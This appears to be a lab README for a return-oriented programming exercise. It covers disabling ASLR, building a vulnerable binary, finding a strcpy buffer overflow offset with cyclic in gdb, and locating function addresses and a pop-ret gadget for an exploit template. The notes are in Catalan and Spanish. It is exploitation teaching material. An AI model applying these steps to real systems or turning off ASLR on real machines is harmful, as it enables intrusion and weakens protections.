# ROP

## Requirements

- pwntools
- pwndbg

Disable ASLR

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

> Don't forget to reenable the feature
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

## X64?

You will need 32-bit development headers and libraries

```bash
sudo apt-get install gcc-multilib
```

## Let's build the binary

```bash
make
```

## Do some research

```bash
gdb ./rop1
 
info functions # POdem veure main / vulnerable / rop1 rop2

disassemble vulnerable # Podem veure que fa una call a strcpy (potencial bof)

disassemble rop1 # Podem veure que només executa Puts # PRintF però al no passar cap parametre és més eficient

disassemble rop2 #crida a printf i es passa un parametre ebp+0x8
```

# Break the code!

```bash
gdb ./rop1
run $(python3 -c 'from pwn import *; print(cyclic(500))')
cyclic -l 0x61646261 #110
run $(python3 -c 'from pwn import *; import sys; print("A"*112 + "B"*4)')
```

## ROP

-> Buscamos las variables de las funciones

```bash
gdb ./rop1
b main
run
--
p rop1
p rop2
p exit
```

> Rellenamos la plantilla con los valores


-> Buscamos un gadget pop; ret
```bash
rop --grep 'pop' # pop ebx; ret

# 0x5655601e

> rellenamos la plantilla (exploit_template.py)
```
